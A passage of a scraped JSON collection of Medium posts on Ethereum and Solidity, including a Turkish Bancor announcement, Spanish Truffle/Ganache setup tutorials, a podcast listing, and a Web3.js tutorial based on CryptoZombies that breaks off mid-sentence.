"Ethereum", "Smart Contracts", "Solidity"]}, {"title": "Bancor Protokol\u00fc", "post_link": "https://medium.com/bancor-protokol%C3%BC/bancor-protokol%C3%BC-7a3ea8cd5f45?source=search_post", "author_name": "Bancor", "author_link": "https://medium.com/@bancor", "publish_date": "2017-07-13", "last_modified_date": "2018-05-01", "readtime": "1.56", "claps": 0, "voters": 0, "content": "Bancor Protokol\u00fcBancorFollowJul 13, 2017 \u00b7 2 min readMerhaba D\u00fcnya, Bizler Bancor Protokol\u00fcn\u00fcn (PDF) ard\u0131ndaki ekibiz ve blokzincir \u00fczerinde merkezsiz, hiyerar\u015fik bir para sistemi olu\u015fturuyoruz.\u0130nsanlar aras\u0131ndaki de\u011fi\u015fim/takas d\u00fcnyas\u0131na bakt\u0131\u011f\u0131m\u0131zda, payla\u015ft\u0131\u011f\u0131m\u0131z ve ticarette bulunan iki ana kategori g\u00f6r\u00fcyoruz \u2014 Bilgi ve De\u011fer. Bilgiler (resimler, metinler, video vb. gibi i\u00e7erik) do\u011fas\u0131 gere\u011fi yinelenen olsa da (siz onu payla\u015ft\u0131\u011f\u0131n\u0131zda siz ve bir ba\u015fkas\u0131 da sahibi olur), de\u011fer b\u00f6yle de\u011fildir (onu birisine verince, art\u0131k sahibi siz de\u011filsiniz.)\u0130nternet \u00e7a\u011f\u0131ndan \u00f6nce, yeterince ya\u015fl\u0131 olan hat\u0131rlayacakt\u0131r, bir\u00e7ok \u00f6zel bilgi a\u011f\u0131 vard\u0131 bunlardan baz\u0131lar\u0131; BBS, Prodigy, Compuserve, AoL ve birka\u00e7 tanesi daha. Halka a\u00e7\u0131k \u0130nternet\u2019in y\u00fckseli\u015fi her \u015feyi de\u011fi\u015ftirdi ve bunlar\u0131n i\u00e7inden kar\u015f\u0131l\u0131kl\u0131 anla\u015fmalar yoluyla birbirine ba\u011fl\u0131 TCP/IP a\u011flar\u0131na dayanan bilgi al\u0131\u015fveri\u015finde k\u00fcresel standarda adapte olabilenler hayatta kald\u0131.Blokzincir\u2019e kadar, de\u011feri temsil eden t\u00fcm para birimleri, kapal\u0131 silolarda ya\u015f\u0131yordu. Bitcoin\u2019in \u00f6nc\u00fcl\u00fc\u011f\u00fcnde getirilen Blokzincir teknolojisi, merkezsiz bir de\u011fer de\u011fi\u015fim/takas a\u011f\u0131, \u0130nternet\u2019in paras\u0131. G\u00fcn\u00fcm\u00fcz\u00fcn \u00f6zel bankac\u0131l\u0131k a\u011flar\u0131n\u0131n b\u00fcy\u00fck bir b\u00f6l\u00fcm\u00fcn\u00fcn yerini alacak ve kimsenin sahip olmad\u0131\u011f\u0131, k\u00fcresel bir sistemde yeni de\u011ferler yaratacak ve a\u00e7\u0131k bir \u015fekilde i\u015flem yapacak yeni oyunculara (adapte olabilen eskilere de) imk\u00e2n verecektir.Bancor ekibi, 90'l\u0131 y\u0131llar\u0131n sonlar\u0131ndan beri \u0130nternet\u2019te \u00fcr\u00fcnler geli\u015ftiriyor. Firmalar\u0131m\u0131z\u0131n baz\u0131lar\u0131; Contact Networks, MetaCafe, Mytopia, Particle Code ve AppCoin\u2019dir. 2011'de Bitcoin\u2019e girdik ve kullan\u0131c\u0131 taraf\u0131ndan \u00fcretilen para birimlerindeki olanaklar\u0131 ara\u015ft\u0131rmaya ba\u015flad\u0131k. Ethereum\u2019un 2015 y\u0131l\u0131nda piyasaya s\u00fcr\u00fclmesinin ard\u0131ndan ak\u0131ll\u0131 s\u00f6zle\u015fmelerin bir oyun de\u011fi\u015ftirici oldu\u011funu ve para birimi olu\u015fturulmas\u0131na ve \u00f6zelle\u015ftirilmesine imk\u00e2n verdi\u011fini anlad\u0131k. De\u011fer y\u00f6neten ve tutan programlanabilir mod\u00fcller, (token olarak temsil ediliyor) \u015fu anda \u00e7e\u015fitli kurulu\u015flar (\u00f6rne\u011fin, garant\u00f6r (escrow) hizmetleri, borsalar, hukuk firmalar\u0131 ve birka\u00e7 tane daha) taraf\u0131ndan ele al\u0131nan \u00f6nemsiz maliyet s\u00fcre\u00e7leri i\u00e7in de\u011fer ile ilgili i\u015flemleri ger\u00e7ekle\u015ftirebilir. Bununla birlikte, de\u011fer de\u011fi\u015fiminde a\u00e7\u0131k bir standart \u00fczerinde dijital para idare edebilen otonom merkezsiz kodun sonu\u00e7lar\u0131 \u00e7ok daha derindir.2016 yaz\u0131nda, merkezsiz bir k\u00fcresel borsan\u0131n temelini atacak kriptoparalar i\u00e7in yeni bir standart t\u00fcr\u00fcn\u00fc olu\u015fturmak \u00fczere hiyerar\u015fik bir para sistemi (Burada bir dijital token, di\u011fer tokenleri kendi rezervinde tutar) olu\u015fturmak amac\u0131yla Bancor \u00fczerinde \u00e7al\u0131\u015fmaya ba\u015flad\u0131k. Otonom olan, makas fark\u0131 olmayan, kar\u015f\u0131 taraf riski bulunmayan ve herhangi bir asset i\u00e7in s\u00fcrekli likidite sa\u011flayan bir sistem. \u0130\u00e7erik i\u00e7in internetin yapt\u0131\u011f\u0131 gibi, para birimlerinin long-tail\u2019ini olanak tan\u0131yan bir sistem.\u0130ncelemeniz ve yorumlar\u0131n\u0131z i\u00e7in whitepaper tasla\u011f\u0131n\u0131 sizlerle payla\u015fmak istiyoruz. T\u00fcm geri bildirimlere a\u00e7\u0131\u011f\u0131z.Bancor Ekibihttp://bancor.network", "responses": 0, "tags": ["Bitcoin", "Blockchain", "Ethereum", "Smart Contracts", "Solidity"]}, {"title": "", "post_link": "https://medium.com/@gaurav.agrawal/for-those-who-are-getting-some-sort-of-error-while-using-truffle-migrate-8f5f87310ca9?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2018-09-27", "last_modified_date": "2018-09-27", "readtime": "0.22", "claps": 1, "voters": 1, "content": "truffle migrateTest A Smart Contract With Truffle5209arjuna sky kokGaurav AgrawalFollowSep 27, 2018 \u00b7 1 min readFor those who are getting some sort of error while using \u201ctruffle migrate\u201d. On Truffle Console you don\u2019t need to use Truffle as prefix in your commands. Just hit \u201cmigrate\u201d and it will work.truffle console: SyntaxError: Unexpected identifier \u00b7 Issue #910 \u00b7 trufflesuite/truffleTruffle migrate is working good but while running truffle console SyntaxError: Unexpected identifier at new Script\u2026github.com", "responses": 0, "tags": ["Ethereum", "Solidity", "Truffle", "Tutorial", "Web3"]}, {"title": "#1 \u2014 Austin Griffith \u2014 Meta Transactions", "post_link": "https://medium.com/tokenpoints/1-austin-griffith-meta-transactions-bda731ce587e?source=search_post", "author_name": "Gianni D\u2019Alerta", "author_link": "https://medium.com/@giannidalerta", "publish_date": "2018-10-25", "last_modified_date": "2018-10-25", "readtime": "0.68", "claps": 0, "voters": 0, "content": "#1 \u2014 Austin Griffith \u2014 Meta TransactionsGianni D\u2019AlertaFollowOct 25, 2018 \u00b7 1 min readIn our first episode of Token Points our guest Austin Griffith talks about his journey into blockchain. How building games allowed him to learn about Ethereum and Solidity development. We discover how this journey led to obstacles in UX and how he is now dedicated his time for research in the fascinating space of meta transactions.Guest: Austin Griffith \u2014 twitter.com/austingriffithWebsite: austingriffith.comYoutube: www.youtube.com/channel/UC_HI2i2peo1A-STdG22GFsAGithub: github.com/austintgriffithLinks mentioned in this episode:Gallaeas: galleass.ioCryptogs: cryptogs.ioMetaTx.io: MetaTx.ioToken Subscriptions: tokensubscription.comThis episode is also available on :YouTube: https://www.youtube.com/watch?v=_8V7MtTzv2o&SoundCloud: https://soundcloud.com/tokenpoints/1-austin-griffithWatch or listen, Token Points is available where ever podcasts can be heard.TokenPoints is hosted by:Gianni D\u2019Alerta \u2014 twitter.com/GianniDalertaAdam B Levine \u2014 twitter.com/GamerAndy", "responses": 0, "tags": ["Blockchain", "Ethereum", "Podcast", "Solidity", "Nft"]}, {"title": "Trabajando con Smart Contracts en Ethereum \u2014 Parte I", "post_link": "https://medium.com/kubide/trabajando-con-smart-contracts-en-ethereum-parte-i-b93ee67e74ce?source=search_post", "author_name": "\u00c1ngel Luis Quesada", "author_link": "https://medium.com/@gelito", "publish_date": "2019-02-07", "last_modified_date": "2019-02-07", "readtime": "2.31", "claps": 0, "voters": 0, "content": "Trabajando con Smart Contracts en Ethereum \u2014 Parte IIntro \u2014 Entornos de Implementaci\u00f3n\u00c1ngel Luis QuesadaFollowFeb 7 \u00b7 3 min readFoto cortes\u00eda de Silvia Rodriguez\u00daltimamente no paramos de ver muchos art\u00edculos sobre qu\u00e9 es blockchain, qu\u00e9 son las criptomonedas y qu\u00e9 se puede hacer con un Smart Contract en Ethereum, pero pocos en los que realmente nos bajemos al barro, nos manchemos las manos y empecemos a trabajar, de una forma profesional, con Solidity.Por eso, vamos a empezar una serie de art\u00edculos sobre Solidity donde os contaremos c\u00f3mo creamos, y trabajamos, desde Kubide, con este nuevo lenguaje.No queremos ser otro \u201chello world\u201d, para eso, os recomendamos que os le\u00e1is la documentaci\u00f3n oficial, que es bastante buena. Pero si que espero que os sirva de bastante ayuda a la hora de organizaros para acometer un gran proyecto en Blockchain.Empezaremos mostrando nuestro entorno de implementaci\u00f3n con esta tecnolog\u00eda, nuestro boirleplate, haremos un Smart Contract b\u00e1sico y usaremos NodeJs para consumirlo (si, NodeJS, porque tambi\u00e9n hemos visto much\u00edsimos art\u00edculos para hacerlo desde Web con React o Angular, y no queremos repetir)En un proceso normal de trabajo, al igual que con cualquier otro proyecto o lenguaje de programacion, solemos dividir el entorno de implementaci\u00f3n en 5 \u00e1reas delimitadas:En un proceso normal de trabajo, al igual que con cualquier otro proyecto o lenguaje de programacion, solemos dividir el entorno de implementaci\u00f3n en 5 \u00e1reas delimitadas:Entorno localCada uno de los desarrolladores de blockchain tiene que poder trabajar desde sus propios equipos creando, testando y modificando el c\u00f3digo de los Smart Contracts.Debe tener una infraestructura m\u00ednima en su equipo que le permita programar y hacer los deploys de una forma sencilla.Para eso necesitaremos, como poco, un IDE de trabajo compatible con Solidity y una Blockchain local, o testnet, sobre la que hacer las pruebas.DesarrolloUna vez un Smart Contract cumple los requerimientos b\u00e1sicos del proyecto, hacemos un deploy a nuestro entorno de desarrollo. As\u00ed todo el equipo puede ponerse manos a la obra a probarlo e integrarlo con las dem\u00e1s partes del proyecto sin miedo a compartir informaci\u00f3n fuera de nuestra red.En este caso, veremos c\u00f3mo crear una blockchain privada y como integrar nuestro Smart Contract contra un API en NodeJS.StagingHay que entender que un Smart Contract no se puede modificar. Cometer un fallo en el planteamiento de un Tokenomics o en el desarrollo del mismo, puede ser bastante grave, puede no tener posibilidad de rollback o, peor, unos costes inmensos tanto para la empresa como para los usuarios.Por eso, cuando trabajamos con Smarts Contrats la parte de testing es muy importante, m\u00e1s incluso que la de desarrollo.Todo nuestro c\u00f3digo va con Test de integraci\u00f3n, pero aun as\u00ed, es muy recomendable esta fase previa al lanzamiento a producci\u00f3n, utilizamos las Testnets de Rinkeby y/o Ropsten (enlaces) donde podremos conseguir ETH gratis para hacer todo tipo de test en un entorno real y donde podremos mostrar nuestros Smart Contracts al mundo para ponerlos realmente a prueba sin riesgo alguno.Producci\u00f3nUna vez hemos validado nuestro Smart Contract, ya podremos hacer el deploy a producci\u00f3n del mismo, configurar el c\u00f3digo de nuestra API en NodeJS para que conozca la direcci\u00f3n real y empezar a usarlo!Kubide es el primer Tech Builder especializado en la creaci\u00f3n y lanzamiento de Startups. Si crees que podemos ayudarte a lanzar tu pr\u00f3ximo proyecto \u00a1s\u00f3lo tienes que dec\u00edrnoslo aqu\u00ed!", "responses": 0, "tags": ["Ethereum", "Solidity", "Solidity Tutorial"]}, {"title": "Trabajando con Ethereum en grandes proyectos \u2014 Parte II", "post_link": "https://medium.com/kubide/trabajando-con-ethereum-en-grandes-proyectos-parte-ii-af454f8935b3?source=search_post", "author_name": "\u00c1ngel Luis Quesada", "author_link": "https://medium.com/@gelito", "publish_date": "2017-12-26", "last_modified_date": "2019-03-07", "readtime": "3.46", "claps": 0, "voters": 0, "content": "Trabajando con Ethereum en grandes proyectos \u2014 Parte IICrear el entorno de trabajo local\u00c1ngel Luis QuesadaFollowDec 26, 2017 \u00b7 4 min readFoto cortes\u00eda de Silvia RodriguezComo os comentamos en el post anterior, nuestra idea es ir paso a paso contando todo el flujo de vida de un Smart Contract dentro de un gran proyecto.Y, en este caso, empezaremos por crear un entorno de trabajo local que, como siempre, podr\u00e9is ver completo en este proyecto de Github.Lo primero que hay que hacer es inicializar el proyecto con Node y Truffle, as\u00ed como todos los m\u00f3dulos necesarios para el proyecto.npm initnpm install \u2014 save trufflenpm install \u2014 save-dev ganache-cliRecordar que lo hemos instalado todo de forma local, as\u00ed que tendremos que crear, en el package.json, los comandos necesarios para poder acceder a truffle y a ganache-cli:{    \u201cscripts\u201d: {        \u201ct\u201d: \u201ctruffle\u201d,        \u201ctest\u201d: \u201ctruffle test\u201d,        \u201ctestnet\u201d: \u201cganache-cli\u201d    }}Ahora podr\u00e9is ejecutarlos mediante:npm run tnpm run testnpm run testnetLos dos primeros fallar\u00e1n ya que todav\u00eda no est\u00e1 configurado truffle. El tercero, la testnet, es recomendable que la abr\u00e1is en un terminal diferente, ya que tendr\u00e1 que estar siempre arrancada.Nota: Recordar que pod\u00e9is a\u00f1adir flags a los comandos a\u00f1adiendo dos guiones \u201c\u2013\u201d antes de los flags que quer\u00e1is pasar al comando.Por ahora, poco podemos hacer, as\u00ed que vamos a arrancar truffle para que nos instale toda su configuraci\u00f3n base.npm run t initEsto nos genera un fichero y los tres directorios que necesita truffle para trabajar.Contracts: es el directorio donde ir\u00e1n todos los contratos de Solidity que realicemos.Migrations: En este directorio se guardan los scripts necesarios para hacer el deploy de los contratos a la blockchain. Hay que tener en cuenta que nuestro c\u00f3digo no est\u00e1 directamente en la blockchain sino que hay que hacer una serie de transacciones para que sea accesible desde la misma, tambi\u00e9n es importante porque, en caso de que se necesiten varios Smart Contracts, es aqu\u00ed donde diremos como se deben subir y cual es la relaci\u00f3n entre todos ellos.Test: Porque ya no sabemos programar sin hacer test!! En nuestro caso usaremos los test en JS (usa por debajo Mocha), aunque tambi\u00e9n los hay en formato Solidity.truffle.js En este fichero debe estar la configuraci\u00f3n b\u00e1sica de truffle para hablar con las diferentes redes blockchain con las que trabajes. En la documentaci\u00f3n de Truffle os indican como pod\u00e9is configurarlo. Por ahora usaremos la configuraci\u00f3n b\u00e1sica.La propia suite de truffle trae por defecto una testnet que parte de la de ganache-cli, podr\u00edamos usar esta por defecto con el comando \u201cnpm run t \u2014 develop\u201d, esta testnet, en nuestro caso, est\u00e1 usando el puerto 9545, mientras que la blockchain de ganache-cli corre bajo el 8545, y la app de Ganache est\u00e1 en el puerto 7545, por lo que en la configuraci\u00f3n de truffle.js podr\u00e9is poner:module.exports = {  // See <http://truffleframework.com/docs/advanced/configuration>  // to customize your Truffle configuration!  networks: {    truffle: {      host: 'localhost',      port: 9545,      network_id: '*' // Match any network id    },    ganache: {      host: 'localhost',      port: 7545,      network_id: 5777    },    development: {      host: 'localhost',      port: 8545,     network_id: '*' // Match any network id    },  }};Por otro lado, aqu\u00ed os cuentan un poco sobre los network_id, no entraremos mucho en detalle para no salir de contexto, pero hay que saber que hay una lista definida de los principales network ids y que las redes testnet suelen poner el suyo de forma aleator\u00eda, de ah\u00ed que se suela poner el aster\u00edsco \u201c*\u201d para los de desarrollo.Podr\u00e1s elegir cualquiera de las redes simplemente nombr\u00e1ndolas, por ejemplo:# Probar la red de ganacha-clinpm run t console# Probar la red testnet de trufflenpm run t console -- --network truffleY, para comprobar que todo funciona correctamente s\u00f3lo tenemos que arrancar las dos redes blockchain en dos terminales distintos y, sin cerrarlas, arrancar la consola de truffle conect\u00e1ndose a cada una de ellas:# Para arrancar la red de ganache-clinpm run testnet# Para arrancar la red testnet de trufflenpm run t developY para problarlas# Probar la red de ganache-clinpm run t console# Probar la red testnet de trufflenpm run t console -- --network truffleDeber\u00edas poder conectarte a ambas redes y ver algo similar a esto:> solidity-boilerplate@1.0.0 t /home/gelito/projects/solidity-Boilerplate> truffle \"console\"truffle(development)>Y, por \u00faltimo, el package.json deber\u00eda acabar mostrando algo similar a esto:{  \"name\": \"solidity-boilerplate\",  \"version\": \"1.0.0\",  \"description\": \"A basic boilerplate of a Solidity project\",  \"main\": \"index.js\",  \"scripts\": {    \"t\": \"truffle\",    \"test\": \"truffle test\",    \"testnet\": \"ganache-cli\"  },  \"repository\": {    \"type\": \"git\",    \"url\": \"git+https://github.com/Kubide/solidity-Boilerplate.git\"  },  \"keywords\": [    \"solidity\",    \"truffle\",    \"open-zeppeling\"  ],  \"author\": \"Kubide\",  \"license\": \"ISC\",  \"bugs\": {    \"url\": \"https://github.com/Kubide/solidity-Boilerplate/issues\"  },  \"homepage\": \"https://github.com/Kubide/solidity-Boilerplate#readme\",  \"dependencies\": {    \"truffle\": \"^4.0.4\"  },  \"devDependencies\": {    \"ganache-cli\": \"^6.0.3\"  }}Con esto, m\u00e1s las recomendaciones que os pusimos en el anterior post, ya tendr\u00e9is una estructura b\u00e1sica para empezar a trabajar. Seguiremos avanzando.Y no os olvid\u00e9is del .gitignore!Kubide es el primer Tech Builder especializado en la creaci\u00f3n y lanzamiento de Startups. Si crees que podemos ayudarte a lanzar tu pr\u00f3ximo proyecto \u00a1s\u00f3lo tienes que dec\u00edrnoslo aqu\u00ed!", "responses": 0, "tags": ["Ethereum", "Solidity", "Solidity Tutorial"]}, {"title": "Solidity and Web3.js", "post_link": "https://medium.com/coinmonks/solidity-and-web3-js-141115b0f8c5?source=search_post", "author_name": "Yang Nana", "author_link": "https://medium.com/@yangnana11", "publish_date": "2018-04-04", "last_modified_date": "2019-05-21", "readtime": "11.1", "claps": 800, "voters": 96, "content": "Solidity and Web3.jsReference: cryptozombies.ioYang NanaFollowApr 4, 2018 \u00b7 12 min readHowever, there is another way using web3.js which quite different to this, please also read this: https://medium.com/@yangnana11/interacting-with-a-smart-contract-through-web3-js-tutorial-56a7ff2ff153What is Web3.js?Remember, the Ethereum network is made up of nodes, which each contain a copy of the blockchain. When you want to call a function on a smart contract, you need to query one of these nodes and tell it:The address of the smart contractThe function you want to call, andThe variables you want to pass to that function.Ethereum nodes only speak a language called JSON-RPC, which isn\u2019t very human-readable. A query to tell the node you want to call a function on a contract looks something like this:// Yeah... Good luck writing all your function calls this way!{\"jsonrpc\":\"2.0\",\"method\":\"eth_sendTransaction\",\"params\":[{\"from\":\"0xb60e8dd61c5d32be8058bb8eb970870f07233155\",\"to\":\"0xd46e8dd67c5d32be8058bb8eb970870f07244567\",\"gas\":\"0x76c0\",\"gasPrice\":\"0x9184e72a000\",\"value\":\"0x9184e72a\",\"data\":\"0xd46e8dd67c5d32be8d46e8dd67c5d32be8058bb8eb970870f072445675058bb8eb970870f072445675\"}],\"id\":1}Luckily, Web3.js hides these nasty queries below the surface, so you only need to interact with a convenient and easily readable JavaScript interface.Instead of needing to construct the above query, calling a function in your code will look something like this:CryptoZombies.methods.createRandomZombie(\"Vitalik Nakamoto \ud83e\udd14\")  .send({ from: \"0xb60e8dd61c5d32be8058bb8eb970870f07233155\", gas: \"3000000\" })1. Getting startedDepending on your project\u2019s workflow, you can add Web3.js to your project using most package tools:// Using NPMnpm install web3// Using Yarnyarn add web3// Using Bowerbower install web3// ...etc.Or you can simply download the minified .js file from github and include it in your project:<script language=\"javascript\" type=\"text/javascript\" src=\"web3.min.js\"></script>Web3 ProviderRemember, Ethereum is made up of nodes that all share a copy of the same data. Setting a Web3 Provider in Web3.js tells our code which node we should be talking to handle our reads and writes. It\u2019s kind of like setting the URL of the remote web server for your API calls in a traditional web app.You could host your own Ethereum node as a provider. However, there\u2019s a third-party service that makes your life easier so you don\u2019t need to maintain your own Ethereum node in order to provide a DApp for your users \u2014 Infura.InfuraInfura is a service that maintains a set of Ethereum nodes with a caching layer for fast reads, which you can access for free through their API. Using Infura as a provider, you can reliably send and receive messages to/from the Ethereum blockchain without needing to set up and maintain your own node.You can set up Web3 to use Infura as your web3 provider as follows:var web3 = new Web3(new Web3.providers.WebsocketProvider(\"wss://mainnet.infura.io/ws\"));However, since our DApp is going to be used by many users \u2014 and these users are going to WRITE to the blockchain and not just read from it \u2014 we\u2019ll need a way for these users to sign transactions with their private key.Note: Ethereum (and blockchains in general) use a public / private key pair to digitally sign transactions. Think of it like an extremely secure password for a digital signature. That way if I change some data on the blockchain, I can prove via my public key that I was the one who signed it \u2014 but since no one knows my private key, no one can forge a transaction for me.Cryptography is complicated, so unless you\u2019re a security expert and you really know what you\u2019re doing, it\u2019s probably not a good idea to try to manage users\u2019 private keys yourself in our app\u2019s front-end.But luckily you don\u2019t need to \u2014 there are already services that handle this for you. The most popular of these is Metamask.MetamaskMetamask is a browser extension for Chrome and Firefox that lets users securely manage their Ethereum accounts and private keys, and use these accounts to interact with websites that are using Web3.js. (If you haven\u2019t used it before, you\u2019ll definitely want to go and install it \u2014 then your browser is Web3 enabled, and you can now interact with any website that communicates with the Ethereum blockchain!).And as a developer, if you want users to interact with your DApp through a website in their web browser (like we\u2019re doing with our CryptoZombies game), you\u2019ll definitely want to make it Metamask-compatible.Note: Metamask uses Infura\u2019s servers under the hood as a web3 provider, just like we did above \u2014 but it also gives the user the option to choose their own web3 provider. So by using Metamask\u2019s web3 provider, you\u2019re giving the user a choice, and it\u2019s one less thing you have to worry about in your app.Using Metamask\u2019s web3 providerMetamask injects their web3 provider into the browser in the global JavaScript object web3. So your app can check to see if web3 exists, and if it does use web3.currentProvider as its provider.Here\u2019s some template code provided by Metamask for how we can detect to see if the user has Metamask installed, and if not tell them they\u2019ll need to install it to use our app:window.addEventListener('load', function() {// Checking if Web3 has been injected by the browser (Mist/MetaMask)  if (typeof web3 !== 'undefined') {    // Use Mist/MetaMask's provider    web3js = new Web3(web3.currentProvider);  } else {    // Handle the case where the user doesn't have web3. Probably     // show them a message telling them to install Metamask in     // order to use our app.    // For example    // web3 = new Web3(new Web3.providers.HttpProvider(\"http://localhost:8545\"));  }  // Now you can start your app & access web3js freely:  startApp()})You can use this boilerplate code in all the apps you create in order to require users to have Metamask to use your DApp.Note: There are other private key management programs your users might be using besides MetaMask, such as the web browser Mist. However, they all implement a common pattern of injecting the variable web3, so the method we describe here for detecting the user's web3 provider will work for these as well.2. Talking to ContractsNow that we\u2019ve initialized Web3.js with MetaMask\u2019s Web3 provider, let\u2019s set it up to talk to our smart contract.Web3.js will need 2 things to talk to your contract: its address and its ABI.Contract AddressAfter you finish writing your smart contract, you will compile it and deploy it to Ethereum. We\u2019re going to cover deployment in the next lesson, but since that\u2019s quite a different process from writing code, we\u2019ve decided to go out of order and cover Web3.js first.After you deploy your contract, it gets a fixed address on Ethereum where it will live forever. The address of the CryptoKitties contract on Ethereum mainnet is YOUR_CONTRACT_ADDRESS.You\u2019ll need to copy this address after deploying in order to talk to your smart contract.Contract ABIThe other thing Web3.js will need to talk to your contract is its ABI.ABI stands for Application Binary Interface. Basically it\u2019s a representation of your contracts\u2019 methods in JSON format that tells Web3.js how to format function calls in a way your contract will understand.When you compile your contract to deploy to Ethereum, the Solidity compiler will give you the ABI, so you\u2019ll need to copy and save this in addition to the contract address.Instantiating a Web3.js ContractOnce you have your contract\u2019s address and ABI, you can instantiate it in Web3 as follows:// Instantiate myContractvar myContract = new web3js.eth.Contract(myABI, myContractAddress);3. Calling Contract FunctionsOur contract is all set up! Now we can use Web3.js to talk to it.Web3.js has two methods we will use to call functions on our contract: call and send.Callcall is used for view and pure functions. It only runs on the local node, and won't create a transaction on the blockchain.Review: view and pure functions are read-only and don't change state on the blockchain. They also don't cost any gas, and the user won't be prompted to sign a transaction with MetaMask.Using Web3.js, you would call a function named myMethod with the parameter 123 as follows:myContract.methods.myMethod(123).call()Sendsend will create a transaction and change data on the blockchain. You'll need to use send for any functions that aren't view or pure.Note: sending a transaction will require the user to pay gas, and will pop up their Metamask to prompt them to sign a transaction. When we use Metamask as our web3 provider, this all happens automatically when we call send(), and we don't need to do anything special in our code. Pretty cool!Using Web3.js, you would send a transaction calling a function named myMethod with the parameter 123 as follows:myContract.methods.myMethod(123).send()The syntax is almost identical to call().Getting Zombie DataNow let\u2019s look at a real example of using call to access data on our contract.We made our array of zombies public:Zombie[] public zombies;In Solidity, when you declare a variable public, it automatically creates a public \"getter\" function with the same name. So if you wanted to look up the zombie with id 15, you would call it as if it were a function: zombies(15).Here\u2019s how we would write a JavaScript function in our front-end that would take a zombie id, query our contract for that zombie, and return the result:Note: The code we\u2019re using in this lesson are using version 1.0 of Web3.js, which uses promises instead of callbacks. Many other tutorials you\u2019ll see online are using an older version of Web3.js. The syntax changed a lot with version 1.0, so if you\u2019re copying code from other tutorials, make sure they\u2019re using the same version as you!function getZombieDetails(id) {  return cryptoZombies.methods.zombies(id).call()}// Call the function and do something with the result:getZombieDetails(15).then(function(result) {  console.log(\"Zombie 15: \" + JSON.stringify(result));});Let\u2019s walk through what\u2019s happening here.cryptoZombies.methods.zombies(id).call() will communicate with the Web3 provider node and tell it to return the zombie with index id from Zombie[] public zombies on our contract.Note that this is asynchronous, like an API call to an external server. So Web3 returns a promise here. (If you\u2019re not familiar with JavaScript promises\u2026 Time to do some additional homework before continuing!)Once the promise resolves (which means we got an answer back from the web3 provider), our example code continues with the then statement, which logs result to the console.result will be a javascript object that looks like this:{  \"name\": \"H4XF13LD MORRIS'S COOLER OLDER BROTHER\",  \"dna\": \"1337133713371337\",  \"level\": \"9999\",  \"readyTime\": \"1522498671\",  \"winCount\": \"999999999\",  \"lossCount\": \"0\" // Obviously.}We could then have some front-end logic to parse this object and display it in a meaningful way on the front-end.Getting the user\u2019s account in MetaMaskMetaMask allows the user to manage multiple accounts in their extension.We can see which account is currently active on the injected web3 variable via:var userAccount = web3.eth.accounts[0]\u2026Now let\u2019s look at using send functions to change data on our smart contract.There are a few major differences from call functions:sending a transaction requires a from address of who's calling the function (which becomes msg.sender in your Solidity code). We'll want this to be the user of our DApp, so MetaMask will pop up to prompt them to sign the transaction.sending a transaction costs gasThere will be a significant delay from when the user sends a transaction and when that transaction actually takes effect on the blockchain. This is because we have to wait for the transaction to be included in a block, and the block time for Ethereum is on average 15 seconds. If there are a lot of pending transactions on Ethereum or if the user sends too low of a gas price, our transaction may have to wait several blocks to get included, and this could take minutes.4. Calling Payable FunctionsIn ZombieHelper contract, we added a payable function where the user can level up:function levelUp(uint _zombieId) external payable {  require(msg.value == levelUpFee);  zombies[_zombieId].level++;}The way to send Ether along with a function is simple, with one caveat: we need to specify how much to send in wei, not Ether.What\u2019s a Wei?A wei is the smallest sub-unit of Ether \u2014 there are 10^18 wei in one ether.That\u2019s a lot of zeroes to count \u2014 but luckily Web3.js has a conversion utility that does this for us.// This will convert 1 ETH to Weiweb3js.utils.toWei(\"1\", \"ether\");In our DApp, we set levelUpFee = 0.001 ether, so when we call our levelUp function, we can make the user send 0.001 Ether along with it using the following code:CryptoZombies.methods.levelUp(zombieId).send({ from: userAccount, value: web3js.utils.toWei(\"0.001\", \"ether\") })5. Subscribing to EventsAs you can see, interacting with your contract via Web3.js is pretty straightforward \u2014 once you have your environment set up, calling functions and sending transactions is not all that different from a normal web API.There\u2019s one more aspect we want to cover \u2014 subscribing to events from your contract.Listening for New ZombiesFrom zombiefactory.sol, we had an event called NewZombie that we fired every time a new zombie was created:event NewZombie(uint zombieId, string name, uint dna);In Web3.js, you can subscribe to an event so your web3 provider triggers some logic in your code every time it fires:cryptoZombies.events.NewZombie().on(\"data\", function(event) {  let zombie = event.returnValues;  // We can access this event's 3 return values on the `event.returnValues` object:  console.log(\"A new zombie was born!\", zombie.zombieId, zombie.name, zombie.dna);}).on(\"error\", console.error);Note that this would trigger an alert every time ANY zombie was created in our DApp \u2014 not just for the current user. What if we only wanted alerts for the current user?Using indexedIn order to filter events and only listen for changes related to the current user, our Solidity contract would have to use the indexed keyword, like we did in the Transfer event of our ERC721 implementation:event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);In this case, because _from and _to are indexed, that means we can filter for them in our event listener in our front end:// Use `filter` to only fire this code when `_to` equals `userAccount`cryptoZombies.events.Transfer({ filter: { _to: userAccount } }).on(\"data\", function(event) {  let data = event.returnValues;  // The current user just received a zombie!  // Do something here to update the UI to show it}).on(\"error\", console.error);As you can see, using events and indexed fields can be quite a useful practice for listening to changes to your contract and reflecting them in your app's front-end.Querying past eventsWe can even query past events using getPastEvents, and use the filters fromBlock and toBlock to give Solidity a time range for the event logs (\"block\" in this case referring to the Ethereum block number):cryptoZombies.getPastEvents(\"NewZombie\", { fromBlock: 0, toBlock: \"latest\" }).then(function(events) {  // `events` is an array of `event` objects that we can iterate, like we did above  // This code will get us a list of every zombie that was ever created});Because you can use this method to query the event logs since the beginning of time, this presents an interesting use case: Using events as a cheaper form of storage.If you recall, saving data to the blockchain is one of the most expensive operations in Solidity. But using events is much much cheaper in terms of gas.The tradeoff here is that events are not readable from inside the smart contract itself. But it\u2019s an important use-case to keep in mind if you have some data you want to be historically recorded on the blockchain so you can read it from your app\u2019s front-end.For example, we could use this as a historical record of zombie battles \u2014 we could create an event for every time one zombie attacks another and who won. The smart contract doesn\u2019t need this data to calculate any future outcomes, but it\u2019s useful data for users to be able to browse from the app\u2019s front-end.Web3.js Events and MetaMaskThe syntax we just described above is from the latest 1.0 release of Web3.js, which uses WebSockets to subscribe to events.However, MetaMask doesn\u2019t yet support the latest events API (although they\u2019re actively working on it \u2014 check this github issue for updates) (MetaMask version 4.5.1)So for now we\u2019ll have to use a separate Web3 provider that supports WebSockets specifically for the events. We can use Infura to instantiate a second copy as follows:var web3Infura = new Web3(new Web3.providers.WebsocketProvider(\"wss://mainnet.infura.io/ws\"));var czEvents = new web3Infura.eth.Contract(cryptoZombiesABI, cryptoZombiesAddress);Then we would use czEvents.events.Transfer to listen to events instead of 